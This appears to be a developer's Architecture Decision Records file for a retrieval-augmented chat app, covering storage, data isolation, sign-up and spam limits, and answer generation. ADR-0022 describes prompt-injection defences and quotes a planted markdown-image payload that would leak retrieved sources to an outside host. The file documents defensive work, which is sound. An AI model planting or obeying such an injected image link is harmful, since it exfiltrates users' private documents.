# Architecture Decision Records

Format: number, title, status, context, decision, consequences. Add new ADRs at the end. Never rewrite an accepted ADR; supersede it.

---

## ADR-0001: Modular monolith with ports and adapters
**Status:** Accepted (2026-11-24)
**Context:** One developer, three weeks, free hosting, components that must stay swappable (embedders, LLMs, index, worker host).
**Decision:** One Python package (`core/`) layered as domain → ports → services, with adapters at the edge and thin entry points (`api/`, `worker/`, `evals/`). Layers are enforced by import-linter.
**Consequences:** Swapping a vendor touches one adapter and one composition root. There is a little ceremony (protocols, fakes) up front.

## ADR-0002: PostgreSQL is the only datastore
**Status:** Accepted
**Context:** Onyx uses Postgres + OpenSearch (+ Redis). We have no budget and a 1 GB Neon free tier.
**Decision:** Postgres holds relational data, ACLs, the job queue, vectors (pgvector, `halfvec`, HNSW) and keyword search (built-in FTS with two configs). Retrieval sits behind a `SearchIndex` port.
**Consequences:** ACLs and content update in one transaction; there are no sync jobs between stores. `ts_rank` is not true BM25; revisit with `pg_search` or OpenSearch when evals justify it.

## ADR-0003: Free, no-card hosting: Vercel + Neon + GitHub Actions
**Status:** Accepted
**Context:** No credit card and no Docker (laptop under 10 GB free). Oracle Always Free needs a card. Render's free web services sleep.
**Decision:** Vercel Hobby hosts `web` (Next.js) and `api` (FastAPI zero-config functions). Neon Free hosts Postgres. GitHub Actions on a public repo is the worker. Supabase Storage holds uploads.
**Consequences:** 300 s function limit, so all heavy work goes to the worker. Hobby is non-commercial only. The repo must stay public (secrets in GitHub Secrets only). Cron frequency is limited by Neon's 100 CU-h/month.

## ADR-0004: Embeddings: OpenAI text-embedding-3-small (1024-d) primary, BGE-M3 secondary
**Status:** Accepted
**Context:** No local models. A budget of about $5/month. We want a measurable comparison for the portfolio.
**Decision:** `text-embedding-3-small` with `dimensions=1024` is the `present` generation. BGE-M3 on Cloudflare Workers AI (free 10k neurons/day) is a second generation for evals. Both use `halfvec(1024)` in `chunk_embeddings`.
**Consequences:** A full backfill costs about $1 per 50M tokens. Switching models is a background reindex plus a generation flip.

## ADR-0005: Answer generation and data-class routing
**Status:** Accepted
**Decision:** OpenAI's small chat model generates answers. Gemini and Groq free tiers are used only for query rewriting, and only when every chunk and message in context is `public`. A `BudgetGuard` enforces the monthly cap.
**Consequences:** Private mail never reaches providers that may train on free-tier data.

## ADR-0006: ACL strings denormalised onto chunks
**Status:** Accepted
**Context:** Onyx stores ACL entries on every chunk and filters in the index.
**Decision:** Principals are `user:`, `group:`, `workspace:`, `public`. `documents.acl` and `chunks.acl` are `text[]` with a GIN index. User principals are resolved at query time.
**Consequences:** One SQL filter enforces access. Visibility changes rewrite a column without re-embedding.

## ADR-0007: Postgres-backed job queue, triggered via repository_dispatch
**Status:** Accepted
**Decision:** A `jobs` table claimed with `FOR UPDATE SKIP LOCKED`, with idempotency keys, heartbeats and a dead state. The API triggers the Actions worker with `repository_dispatch`, plus an hourly cron.
**Consequences:** No Redis or Celery. Moving the worker to a VM later means running the same CLI as a daemon.

## ADR-0008: No cross-encoder by default
**Status:** Accepted
**Context:** Onyx removed its cross-encoder in favour of LLM selection. A CPU reranker is not available to us anyway.
**Decision:** Phase 1 uses RRF only. A `Reranker` port exists. Phase 2 compares LLM selection with hosted rerankers (for example `bge-reranker-base` on Workers AI) on the eval set.

## ADR-0009: Gmail via Takeout import first
**Status:** Accepted
**Context:** Unverified Google OAuth apps in Testing get refresh tokens that expire after 7 days; restricted Gmail scopes need verification.
**Decision:** Ingest a user-uploaded Takeout `.mbox`. A live Gmail API connector waits for a later phase.

## ADR-0010: Same-origin API through a Next.js rewrite
**Status:** Accepted (2026-11-25, spike run against the deployed apps)
**Decision:** `web` rewrites `/api/*` to the `api` deployment, so cookies are first-party and no CORS is needed.
**Consequences:** If SSE is buffered through the rewrite, supersede this with an API subdomain + CORS + CSRF.
**Spike result (2026-11-25):** a temporary `/api/v1/spike/sse` route sent 10 events 0.5 s apart; a script timed their arrival from the dev laptop. Through the web rewrite (`slate-livid-nine.vercel.app/api/...`) they arrived 0.50 s apart (spread 4.51 s, `transfer-encoding: chunked`, `x-vercel-cache: MISS`); directly from the API project, spread 4.50 s. **No buffering.** The rewrite adds ~0.16 s; the ~3.4 s before the first event is cold start plus India to us-east-1 latency, not buffering. M3 chat streams over SSE through the same-origin rewrite; no CORS, cookies stay first-party. The spike code was removed after the run.

## ADR-0011: Neon pgvector capabilities (M0 spike)
**Status:** Accepted (2026-11-24)
**Context:** ARCHITECTURE §4 and §8 rely on `halfvec`, HNSW with `halfvec_cosine_ops`, and iterative index scans so that ACL-filtered vector search doesn't lose recall. We measured this on the Neon `test` branch with `scripts/spike_pgvector.py` (TEMP tables, nothing persisted).
**Findings:**
- Neon runs Postgres 18.7 with pgvector 0.8.7: `halfvec(1024)`, HNSW `halfvec_cosine_ops` and `hnsw.iterative_scan` are all available.
- Forcing the HNSW path with a selective ACL filter (5k rows, 2% visible) returned on average **0.9 of 10** rows (recall@10 0.10). With `hnsw.iterative_scan = relaxed_order` it returned 10 of 10 (recall@10 0.99).
- With 20k rows and 20% visible, iterative scan again filled all 10 slots. Absolute recall was low (0.19) because uniformly random 1024-d vectors have nearly equal distances; this says nothing about real embeddings, whose recall is measured by the M2 eval harness.
- Unforced, the planner chose exact search through the GIN ACL index plus a sort in both cases, even with 4k of 20k rows visible.
- Building HNSW over 20k halfvec(1024) rows took about 26 s on Neon's free compute.
**Decision:** The vector search query sets `SET LOCAL hnsw.iterative_scan = relaxed_order` in its transaction, alongside `hnsw.ef_search` (value tuned by evals in M2). No over-fetch fallback is needed.
**Consequences:** Filtered ANN keeps returning k rows for guests and other narrow principals. `relaxed_order` can return rows slightly out of distance order, so results are re-sorted by distance before fusion (RRF only uses ranks). Small per-user corpora will often be searched exactly via GIN, which is both correct and cheap.

## ADR-0012: Data isolation from free AI providers
**Status:** Accepted (2026-11-24)
**Context:** The owner's rule: private data must never reach AI providers whose free tiers may train on or retain inputs (Gemini, Groq, Cloudflare Workers AI). ADR-0005 stated the rule, but the schema had nowhere to record which data is private.
**Decision:** Defence in depth, so a mistake in one layer is caught by another:
1. `data_class` (`public` | `private`) on `sources`, `documents` and `chunks`, **defaulting to `private`**. Chunks carry it (like `acl`) so the router sees exactly what was retrieved.
2. Database CHECKs: data may be `public` only if its ACL already contains `public` (readable by anyone), and `gmail_mbox` sources are always `private`.
3. One pure routing rule, `core/domain/data_class.may_send`: a free-tier call is allowed only if **every** input (retrieved chunks, earlier turns, the question) is public. Unknown or missing classes count as private (fail closed).
4. `embedding_generations.data_scope`: a generation served by a free provider (BGE-M3 on Workers AI) is `public`-scoped, so private chunks are never sent to it. Private evals use OpenAI embeddings only.
5. `usage_ledger.data_class` records the most sensitive class of every model call, so it's auditable that no private call went to a free provider.
6. **Rows can't disagree with their parents** (added after the security review): composite foreign keys force `documents.(workspace_id, data_class)` to equal its source's and `chunks.(workspace_id, data_class)` to equal its document's, with `ON UPDATE CASCADE`; a trigger makes `chunks.acl` always a copy of `documents.acl`; a trigger rejects a private chunk's embedding under a `public`-scoped generation. So a Gmail document can't be public, a chunk can't move to another workspace, and narrowing a document's ACL narrows its chunks in the same transaction.
**Workspace-scoping exceptions (deliberate):** `embedding_generations` and `eval_runs` are global, because the embedding model is a system-wide choice. `ingestion_errors` and `messages` are reached only through a workspace-scoped parent (`ingestion_runs`, `chat_sessions`).
**Consequences:** Private data goes only to OpenAI's paid API (no training on API inputs by default). Marking data public is a deliberate act that the database double-checks. A guest-facing query rewrite may use a free provider only for fully public conversations. Isolation tests: `tests/unit/core/domain/test_data_class.py`, `tests/integration/migrations/test_0001_schema.py`.

## ADR-0013: Embedding generations: status plus partial unique indexes
**Status:** Accepted (2026-11-24)
**Context:** Exactly one embedding generation may be `present` (served by search) and at most one `future` (being built). Options: an application check (racy), a singleton pointer row (atomic flip, but `future`/`past` still need tracking), or database-enforced uniqueness.
**Decision:** Keep the `status` column and add partial unique indexes `UNIQUE (status) WHERE status = 'present'` and the same for `'future'`. A flip is two statements in one transaction: demote the old `present` to `past`, then promote the `future`.
**Consequences:** The database makes two present generations impossible, with no race. Readers see the switch atomically at commit. History stays in the same table.

## ADR-0014: Uploads in Neon Object Storage instead of Supabase Storage
**Status:** Accepted (2026-11-24). Supersedes the storage part of ADR-0003.
**Context:** The owner asked to keep everything on Neon. Neon Object Storage is S3-compatible, free on the Free plan (5 GB per project, no card, limits block rather than bill) and available in our region (aws-us-east-1). Buckets branch with the database, so a test branch gets its own copy of the files its rows point at.
**Decision:** Store uploaded originals in a private `uploads` bucket declared in `neon.ts` and provisioned with `neon deploy`. The `BlobStore` port gets an S3 adapter (path-style addressing, SigV4) configured from the AWS-standard env vars Neon injects (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_ENDPOINT_URL_S3`, `AWS_REGION`). Downloads go through short-lived presigned URLs. Supabase is dropped from the stack.
**Consequences:**
- One provider, one credential system, one CLI. No Supabase account is needed.
- **Egress risk:** object downloads count toward the Free plan's 5 GB/month public network transfer, which is shared with Postgres. Exceeding it suspends the database until the next billing period. The worker should download each upload once per processing run, and previews serve extracted text from Postgres rather than the original file.
- Storage is 5 GB per project, so the 25 MB per-file upload limit stays.
- `neon deploy` and `neon env pull` overwrite `DATABASE_URL` in `.env` with the linked branch's URL. Integration tests now refuse to run when `DATABASE_URL` and `DATABASE_URL_DIRECT` point at different Neon endpoints.
- The bucket exists on `production`. Branches created *afterwards* inherit it; the pre-existing `test` branch needs `neon deploy` against it before blob integration tests run.

## ADR-0015: Gmail via an Internal Google Workspace OAuth app
**Status:** Accepted (2026-11-24). Supersedes ADR-0009.
**Context:** The owner wants a "Connect Gmail" button like major platforms, not a Takeout upload. ADR-0009's objections apply to *External* OAuth apps: unverified apps in testing mode get refresh tokens that expire after 7 days, and restricted Gmail scopes need Google's security assessment. An app whose user type is **Internal** to a Google Workspace organisation is exempt from verification and the 7-day expiry, for users inside that organisation.
**Decision:** The Gmail connector (M6) uses OAuth 2.0 with an Internal app in the owner's Google Workspace, scope `gmail.readonly`, offline access (refresh token). The refresh token is stored Fernet-encrypted in `credentials`. Sync uses the Gmail API history endpoint for incremental polling. Gmail sources stay `private` (ADR-0012, enforced by a DB CHECK).
**Consequences:** Only accounts in the owner's Workspace can connect, not personal @gmail.com accounts; the UI says so. The connector needs a stable OAuth redirect URL, so local development uses `http://localhost` (allowed by Google) until the app is deployed. The Takeout `.mbox` import may return later as a fallback for non-Workspace accounts. Needs `CREDENTIALS_FERNET_KEY` and the Google OAuth client id and secret in env.

## ADR-0016: Direct-to-storage uploads with presigned POST
**Status:** Accepted (2026-11-24)
**Context:** Vercel functions accept at most 4.5 MB per request body, but uploads may be up to 25 MB. Streaming files through the API would also count against Neon's shared 5 GB/month egress twice.
**Decision:** Browsers upload straight to Neon Object Storage with a presigned **POST** whose policy pins the key, the Content-Type and `content-length-range [1, 25 MB]`, so the bucket enforces the limit. The browser computes the file's SHA-256 (WebCrypto) so duplicates are detected before any bytes move. The API returns an HMAC-signed, 15-minute upload token (no server-side state) and, on `complete`, verifies the token, HEADs the object for its size and reads only the first 8 KB to sniff the real type. The worker downloads the file once and rejects it if the SHA-256 doesn't match. Object keys are `uploads/<workspace>/<uploader>/<sha256>.<ext>`, so no member can obtain an upload URL for another member's object. Bucket CORS allows only the app's origin.
**Consequences:** No request-size ceiling from the host. Duplicate uploads cost one small API call. A client that lies about the hash only wastes its own upload, because the worker fails the job. Two system sources ("Uploads", "Public uploads") exist per workspace because documents must share their source's data class (ADR-0012).
**Amendment after the security review (2026-11-24):**
- **The worker is the security gate, not `complete`.** The presigned form stays valid for 10 minutes, so the object can be replaced after `complete` checks it. `process_upload` must download the object once with a byte cap of 25 MB, then hash, sniff, fully validate and parse *those same bytes* (no second GET). It marks the job dead if the SHA-256 differs from the payload's. For DOCX it checks the OOXML structure and caps decompressed size and ratio (zip bombs). For text it decodes the whole file. Tests must cover each of these.
- **Abuse limits:** 30 upload starts per hour and 500 MB of announced bytes per day per uploader, using a generic Postgres rate limiter (`rate_events`, migration 0003). Objects whose upload never completed are swept by the worker (to do: slice 4).
- **Dedup compares access, not just bytes:** a re-upload with a different visibility returns `visibility_differs` with the existing document's id (changing visibility is an explicit action), never "duplicate". The job key is per workspace, so both upload sources share it.
- **Key separation:** upload tokens are signed with `HMAC(SESSION_SECRET, "slate/upload-token/v1")`, never the raw secret. Every future signed artefact derives its own sub-key the same way.
- **The ingestion run is created by the worker when processing starts**, so duplicate `complete` calls can't leave orphan runs. A dead job is retried under the deterministic key `…:retry-of:<dead job id>`.
- **Presigned downloads force `Content-Disposition: attachment`** and a generic content type, so uploaded HTML never renders on the storage origin.
- **Integration tests prove that Neon itself rejects** an oversized body, a changed key, a changed Content-Type and an expired form.

## ADR-0017: Seekworthy-style design system (warm stone, role type scale, panel grammar)
**Status:** Accepted (2026-11-24). Replaces the Answerline/Trakkr direction in `UI_DESIGN.md` §2 and §4.1–4.2.
**Context:** The owner judged the M1 screens visually weak: 14–22 px type and loose spacing made a data tool read like a marketing page, the cool greys looked flat, and every page was a padded column. The owner supplied the Seekworthy codebase (MIT) as the reference for sign-up, dashboard and app chrome.
**Decision:** Adopt Seekworthy's design language, not its code or brand. (1) **Tokens:** warm stone neutrals (Tailwind stone 100–900) with the same blue accent (`#3050F0`). The values change in `web/src/styles/tokens.css` only, so every existing utility follows. (2) **Role type scale** in `globals.css`: `label` 10, `data` 11, `caption` 12 (controls), `body` 13, `ui` 14, `page` 20, `metric` 24, `display` 36, each with a flat 1.5 line height. (3) **Font:** Inter via `next/font/google`, which is self-hosted at build time, replacing the Inter Tight files. (4) **Panel grammar** (`components/panel.tsx`): full-bleed cells split by hairlines, with no floating cards on app pages. (5) **Shell:** a 200 px sidebar that collapses to a 60 px rail, with the state kept in `localStorage`. (6) **Auth:** Seekworthy's `/join` layout (badge, headline, 440 px card, icon-prefixed fields, live password hints, perks) applied to Sign-in and Setup. No open sign-up is added. (7) A **Home** dashboard derived from `GET /sources` only.
**Kept from before, on purpose:** WCAG 2.2 AA. Input borders stay at ≥ 3:1 (`--sl-border-input` `#8F8A85`), where Seekworthy uses a 1.4:1 hairline. Password hints mirror `validate_password` (length only, NIST SP 800-63B) instead of Seekworthy's composition rules. There is still no dark theme.
**Consequences:** No Seekworthy logo, name, copy or assets ship. The 12 px control text is denser; touch inputs stay at 16 px to stop iOS zooming in. Home adds no endpoint and no polling beyond the existing "only while processing" rule, so the Neon budget is unchanged. Search and Chat (M2, M3) must be built with the panel grammar.

## ADR-0018: Client-side connection pool for the API (replaces NullPool)
**Status:** Accepted (2026-11-24). Supersedes the `NullPool` choice in ARCHITECTURE "Two DB URLs".
**Context:** Every API request took 2–5 s on an almost empty database. Measured with `scripts/bench_api.py` (dev laptop → Neon aws-us-east-1): each new connection cost about 1.3 s (TCP + TLS + SCRAM auth is about 6 round trips), and with `NullPool` every unit of work opened one. A signed-in `GET /sources` opened 2 connections and took 4.4 s at p50. Queries themselves were trivial.
**Decision:** The pooled engine keeps a small `QueuePool` (`pool_size=2`, `max_overflow=3`, `pool_timeout=5`, `pool_recycle=120`) on Neon's PgBouncer endpoint, with `prepare_threshold=None` still set. No `pool_pre_ping`, because it adds a round trip to every checkout. Instead, the UoW's first statement (`SET LOCAL statement_timeout`) detects a dead connection (`connection_invalidated`), discards it and retries once, which is safe because no caller work has run yet. The engine times every physical connect into a per-request contextvar (`core/request_metrics.py`), and the access log and the `Server-Timing` header report `db_connects` and `db_connect_ms`.
**Result:** Warm requests open 0 connections. p50 latency: `/me` 2096 → 876 ms, `/auth/status` 2144 → 892 ms, `/sources` 4366 → 1755 ms, `/readyz` 4260 → 1766 ms (n=15).
**Consequences:** Through PgBouncer, held client connections don't pin server connections, because those are lent out one transaction at a time. Recycling at 120 s keeps idle clients well under Neon's 5-minute suspend, which still has to be confirmed in the Neon console (CU budget). On Vercel, a cold instance still pays one connect, but warm (Fluid) instances reuse it. Each request still runs one transaction per adapter call, at about 4 round trips each (BEGIN, SET LOCAL, query, COMMIT). Request-scoped units of work and a role-level `statement_timeout` are the next proposals, not done yet.
**Amendment (2026-11-25): auth hero, fonts, motion and guest access.**
- **Auth hero:** Sign-in and Setup use Seekworthy's onboarding hero: a blue gradient panel with its `noise.png` grain, a white headline, a pill email bar, and an animated "How it works" card. One deliberate deviation: Seekworthy's gradient lightens from the top and drops white small text below AA (2.7–4:1). Ours holds `#3050F0` solid for 560 px (white 5.95:1) and lightens only under the card.
- **Fonts:** Inter and JetBrains Mono are self-hosted with `next/font/local` from Seekworthy's Latin-subset files, replacing `next/font/google` Inter and Geist Mono. The rendering is identical to Seekworthy, and builds need no network for fonts. Latin-ext was dropped because `next/font/local` can't give each file its own `unicode-range`; Latin covers U+0000–00FF.
- **Motion:** small hooks in `web/src/lib/motion.ts` instead of an animation library. Loops pause on hover, when offscreen and when the tab is hidden. Reduced motion shows the finished frame. Entrance helpers live in `lib/reveal.ts` (no `"use client"`), so server components can use them.
- **Guest stays; no open sign-up.** Slate is one workspace: a self-registered member would read every Workspace-visible document and could upload files that spend the ~$5/month OpenAI budget. The guest is a read-only viewer of public sources only (`SECURITY.md`), which gives portfolio visitors a one-click demo. "Sign up" means first-run Setup now and invite links in M7. The guest link is renamed "Explore the live demo".
**Amendment 2 (2026-11-25): one-screen hero, even grain, real logo, illustration story.**
- **One screen:** the auth frame is exactly the viewport tall with `clamp()` spacing; the subtitle and card hide only on very short viewports. Verified by headless screenshots at 1366×768, 1366×900, 1920×1080 and 500×900.
- **Even grain with measured contrast:** gradient `#3050F0 → #4260F1 (55%) → #8396F6`, with white text above the 55% stop only (≥ 5.05:1). Grain is two layers of the same tile; the second fades out top to bottom because overlay blending is ~2.5× weaker on dark blue.
- **Logo:** the owner's mark, hand-traced from the PNG into one SVG path and drawn white on an accent tile; it is also the favicon.
- **Marquee shows integrations Slate doesn't have yet, unlabelled (owner's choice).** A reader shouldn't take the logo wall as a feature list: the connectors that exist are listed in ROADMAP.md and in the Add source dialog, which does label availability.
- **`thinking-orbs` pulled forward from M3 to M1** for the sign-in "Ask" column, wrapped once in `components/thinking-orb.tsx` (UI_DESIGN §5).
- **Setup is a one-question-at-a-time wizard in the pill bar** so it fits the one-screen hero. It's still one form; answered fields stay mounted for autofill, and server field errors jump back to their step.

## ADR-0019: Hybrid retrieval core; keyword lane matches any word
**Status:** Accepted (2026-11-25, M2).
**Context:** ARCHITECTURE §8 specifies vector top-50 plus keyword top-50 (`websearch_to_tsquery`), fused with RRF. Running the eval harness keyword-only showed that `websearch_to_tsquery` ANDs every word: "what does KF-5002 mean" found nothing because "mean" isn't in the passage, and the keyword-tagged cases scored Recall@10 0.70. Natural-language questions nearly always contain a word the answer lacks.
**Decision:**
1. A plain query ORs its lexemes (`to_tsvector` → `tsvector_to_array` → quoted lexemes joined with `|`), and `ts_rank_cd` ranks passages that match more of them, closer together, higher. A query that uses search syntax (quotes, `-word`, ` or `) keeps `websearch_to_tsquery`'s strict semantics. Both lanes still run over `tsv_en` (stemmed) OR `tsv_simple` (identifiers), filtered by workspace, ACL, live document and non-deleting source inside the query.
2. Retrieval is one function, `core/services/search.py::hybrid_retrieve`, used by both `SearchService` and the eval harness, so evals measure exactly what users get.
3. Search degrades rather than fails: no generation, no embedder configured, budget spent or embedder down → keyword-only, with an honest notice in the response.
4. Searches are rate-limited per user (60/min) because each one may spend a paid query embedding.
**Result:** keyword-only over the eval corpus: overall Recall@10 0.936, MRR@10 0.654 (was 0.70 on the keyword cases with AND). The remaining misses are pure paraphrases, which the vector lane is for.
**Consequences:** OR matching returns more weak candidates; RRF and the per-document cap absorb that, and only ranks matter. A query of only stop words matches nothing in the keyword lane (the vector lane still runs).

## ADR-0020: Eval harness in its own workspace; BGE-M3 as a backfilled public generation
**Status:** Accepted (2026-11-25, M2).
**Context:** M2 needs Recall@10 for two embedders. Real data (GitHub, Discord) arrives in M4/M5, BGE-M3 is a free tier that may retain inputs (ADR-0012), and the corpus must be comparable across runs.
**Decision:**
1. **Synthetic corpus in git** (`evals/corpus/`, a fictional company; 14 public and 4 private documents) and 51 cases in `evals/questions.yaml`. `evals.load` indexes it into a dedicated workspace (`slate-evals`) through the production path (`IngestService.index_document`, extracted from `process_upload`), so real users never see it and real data never enters eval numbers. The load is idempotent by checksum.
2. **Every case also runs as a guest**; any private document a guest receives is a leak, and `evals.run` exits non-zero if there is one.
3. **BGE-M3 is a `future` generation with `data_scope='public'`**, built by `python -m worker backfill`: keyset-paged over chunks that have no vector yet, inserts with `ON CONFLICT DO NOTHING`, capped per run, so it is idempotent and resumable. A free-tier provider can't build an `all`-scoped generation (checked in code); the database trigger rejects a private chunk under a public generation. Search keeps serving the `present` generation; the eval harness queries a named generation, so BGE-M3 is measured before anyone flips to it (ADR-0013).
4. **`pyyaml` added to the dev group only** (EVALS.md specifies YAML; evals never ship to Vercel).
5. `eval.yml` is manual (`workflow_dispatch`) only.
**Consequences:** BGE-M3 has no vectors for private documents. Measured (2026-11-25): its private-case recall is not merely keyword-level but *worse* (0.17), because RRF ranks a document missing from one lane below documents found in both; see EVALS.md "Findings". OpenAI therefore stays `present`; BGE-M3 is not flipped. Results are reported by visibility so this isn't hidden. Usage of a backfill is recorded per workspace in `usage_ledger` (its `workspace_id` is NOT NULL). The eval workspace has no members, so it never appears in the UI. `eval_cases` stays unused: the YAML file is the source of truth, reviewed like code.

## ADR-0021: Open sign-up with a personal workspace per account (replaces guest and setup)
**Status:** Accepted (2026-11-25, before M3). Supersedes "Guest stays; no open sign-up" in ADR-0018's amendment, and the first-run setup wizard.
**Context:** Slate is deployed at a public URL. The owner wants visitors to get the whole product (upload, connect sources, chat), like Onyx or ChatGPT: sign up with email and password, and never be asked about a workspace. What Onyx does: one shared deployment per company in single-tenant mode (first user becomes admin, kept safe by an email-domain allowlist or invite-only), and a tenant per sign-up in Onyx Cloud. Copying the single-tenant model on a public URL would let strangers read every workspace-visible document and spend the shared ~$5/month OpenAI budget.
**Decision:**
1. **Every sign-up gets its own workspace**, where the account is `owner` (Onyx Cloud's idea, done cheaply): one transaction inserts the user, a workspace named "{first name}'s workspace" and the membership. Isolation between users is the boundary that already exists (`workspace_id` filters plus ACLs in SQL), so there's no schema per tenant. `memberships_one_per_user` keeps one workspace per account until invites (M7).
2. **The owner is claimed by `OWNER_EMAIL`**: once verified, that account is the platform admin (`is_platform_admin`, which grants no access to other workspaces' documents). Signing up with that address needs `SETUP_TOKEN`; in prod it's refused while no token is set, because otherwise anyone could register the owner's address first.
3. **Email verification with 6-digit codes**, not links (mail scanners pre-open links; codes never land in URLs or logs). Codes are HMAC-SHA256 with a key derived from `SESSION_SECRET` (a plain hash of 10^6 values is reversible in an instant), single use, 15 minutes, 5 tries, and bound to the account and purpose. An unverified account can sign in, verify, resend and sign out. Every route that changes data or spends money needs a verified email (`MutatingIdentity`), and search does too. Accounts left unverified are deleted after 48 h by the worker sweep. Password reset uses the same codes, answers the same way whether or not the account exists, and signs out every session.
4. **Spam protection, layered:** Cloudflare Turnstile on sign-up, resend and reset (free, no card, usually invisible; the server verifies it and **fails closed**; login doesn't use it, so a Turnstile outage can't lock anyone out). A honeypot field. Per-IP (3/hour) and global (50/day) sign-up limits. Code-send limits per account (3/hour, 10/day) and globally (250/day, under Brevo's 300). Code checks per IP (30/hour). One inbox, one account (`email_canonical`: `+tags` dropped everywhere, plus dots and googlemail.com for Gmail). Common disposable-inbox domains refused. A `SIGNUPS_ENABLED` kill switch. Outside dev, sign-up stays closed until both mail and Turnstile are configured.
5. **Four spend caps, checked before every paid call** (`core/domain/budget.py`): global per month (`MONTHLY_LLM_BUDGET_USD`, the hard stop), global per day ($0.50), per workspace per month ($0.25) and per workspace per day ($0.05). A burst of sign-ups can use at most one day's share, and one user can't starve the rest. Ingest refuses; search falls back to keyword-only with a notice. **Storage per workspace:** 50 uploaded documents and 100 MB, checked before the presigned URL is issued (Neon: 1 GB database, 5 GB bucket).
6. **Email over plain SMTP** with the stdlib (`smtplib`, TLS always on, no retries because sending isn't idempotent), so any relay works: Brevo's free tier, or a Gmail app password. No new dependency. In dev, codes go to the API log and any bot-check token is accepted; the composition root wires those stand-ins only when `ENV=dev`.
7. **The guest and the setup wizard are removed** (migration 0004 deletes the guest row, drops `is_guest`, makes `password_hash` NOT NULL). The isolation checks keep their meaning through `Principals.for_outsider` (the eval harness and the M2 gate), plus a new cross-workspace HTTP test.
**Consequences:** Visitors get a real, private product. Sign-up says "this email already has an account", which reveals that an account exists; that can't be avoided without a mail-first flow, so the limits above bound how fast anyone can ask. Reset has a small timing difference (mail is sent only for real accounts). Not done yet, recorded here: the chat question ramp for new accounts arrives with M3's chat routes; a "load sample data" button (copying the eval corpus's chunks and vectors, $0) so a new workspace isn't empty; Google/GitHub SSO; invites and shared workspaces (M7). **Gmail:** the ADR-0015 Internal OAuth app only admits the owner's Google organisation, so other accounts can only import a Takeout `.mbox`; revisit in M6.
**Security review (2026-11-25), fixed:** search now writes every query embedding to the ledger (before, the caps never saw search spend) and is limited to 30 per minute and 1,000 per day per user. `TRUSTED_IP_HEADER` is required in prod (otherwise everyone behind Vercel's proxy shares one rate-limit bucket). Claiming `OWNER_EMAIL` needs the token in every environment except dev. Addresses must be ASCII with a non-empty local part. Mail errors after sign-up no longer cause a 500. Budget days are explicit UTC dates. **Accepted, open:** (a) the storage quota counts finished documents only, so in-flight uploads can overshoot it by up to `BEGIN_LIMIT` files; (b) budget check-then-spend has no reservation, so concurrent jobs can overshoot a cap by one document's estimate; (c) reset requests share the global 250/day mail budget with verification, so a determined attacker could exhaust it for a day. Fix (c) with a separate reset budget if it's ever abused. (d) Migration 0004 fails loudly if two existing users canonicalise alike or a user has more than one membership; neither is possible on the current single-owner data.

## ADR-0022: Cited chat pipeline; abstention by retrieval gate plus model sentinel
**Status:** Accepted (2026-11-25, M3).
**Context:** ARCHITECTURE §8 said to abstain when "no fused candidate clears the tuned threshold". RRF scores are rank-only (`1/(60+rank)`), so even a nonsense question has a top hit with the same score as a perfect one. A fused-score threshold can't tell them apart. The owner chose (2026-11-25): gpt-4o-mini for answers, OpenAI for rewriting too (no free-tier router yet), abstention by gate plus sentinel.
**Decision:**
1. **Pipeline** (`core/services/answer.py`):
   - `prepare` runs first: input, chat ownership, rate limits (6/min, 50/day per user) and the budget. Its errors return as plain problem+json.
   - Then `answer`: rewrite (follow-ups only) -> `SearchService.retrieve` (the same `hybrid_retrieve` evals measure; query embedding spend is recorded) -> gate -> assemble the top 8 passages plus neighbours (ordinal +-1, ACL-filtered in `search.py`, 3,000-token budget) -> stream -> validate citations -> persist the message, citations and usage.
2. **Abstention, two layers:**
   - (a) The retrieval gate: no passages, or the best vector match's cosine similarity below `CHAT_MIN_SIMILARITY` (default 0.30). This abstains with no model call. `hybrid_retrieve` now reports `best_similarity`, and the eval harness reports where the threshold should sit (`answer_gate`).
   - (b) The model is told to reply exactly `NO_ANSWER` when the sources don't answer. `SentinelFilter` holds the stream's first characters until it's clear, so the sentinel never reaches the user.
   - Both persist the same designed reply and send `done` with `abstained: true` and the closest matches. There's no new SSE event.
3. **Prompt boundary:** the rules live in the system prompt. Sources go in a `<sources>` block in the user turn, and anything in a passage that could close the block is escaped. Retrieved text never enters the system prompt, and model output triggers nothing.
4. **Citations:** `[n]` is confirmed with a `citation` event as soon as it completes in the stream, and only when n was shown to this user. Unknown markers are removed from the stored answer, and the UI renders anything unconfirmed as plain text. Citations store ids only; showing a cited passage goes back through the ACL-checked preview.
5. **SSE contract v1:** `meta`, `sources`, `token`, `citation`, `done` and `error`, each with a JSON `data` object carrying `v: 1`, documented in OpenAPI as `ChatEvents`. A failure after streaming starts becomes an `error` event with the request id.
6. **Rewriting** asks for one plain-text query line, not JSON with filters. Anything unusable falls back to the raw question.
**Consequences:** Hopeless questions cost nothing when the gate catches them. The threshold must be re-tuned when the embedder changes (`evals.run` reports it). Partial answers interrupted by an error aren't persisted. The new-account chat ramp in ADR-0021 is replaced by a flat 50 questions a day per user plus the per-workspace daily spend cap ($0.05, about 40 answers), which bounds a new account just as well. Abstention accuracy and citation validity are measured by the paid `evals.answers` runner, which the owner runs.
**Security review (2026-11-25), fixed:**
- Answers render no images. An image URL is fetched on render, so a planted `![](https://x/?d=...)` could leak other sources without a click.
- Model-written links show their domain.
- Only server-confirmed numbers become badges, and the model can't mint its own `cite:` links.
- Spend is recorded in a `finally` block, so an aborted or failed stream (and a rewrite) is still charged, by estimate when the provider's usage never arrived.
- The budget is re-checked against the assembled request's real token count; the pre-flight estimate now covers full history plus the rewrite.
- Every `<` in passages and conversation text is escaped, replacing the tag-name regex.

**Open:** a Content-Security-Policy for the web app (`img-src 'self' data:` and friends) belongs in M7 polish; leading-zero markers like `[01]` are accepted as 1 (harmless).
**Gate tuning (2026-11-25, `evals.run --embedder openai`, `fa7e091`):** best-similarity ranges overlap (answerable min 0.245, no-answer max 0.353), so cosine similarity alone can't separate them on this corpus. The default is 0.20, deliberately low: a false abstention loses a real answer, while a gate miss only costs one cheap call that the sentinel then catches. On this set the gate now abstains on na-004 alone, and the other 3 no-answer cases rely on the sentinel (measured by `evals.answers`).
**Answer evals (2026-11-25):** 53 cases. Abstention 0.943, citation validity 1.000, no injection followed. The 3 false abstentions were the model being over-cautious with the right document retrieved (a fact under a heading; two bare-keyword queries). The prompt now says titles and section headings are part of a source, and that a keyword means "say what the sources say about it". The targeted re-run fixed all 3 and still abstained on all 4 no-answer cases, but exposed an assembly bug: neighbour chunks from *another* section were merged without their heading. A Q2 item inside the Q1 passage was answered as "Q1 2027". A neighbour from a different section now carries its heading as `[heading]` (`AnswerService._assemble`; regression test). Lesson: widening context must preserve each piece's provenance.

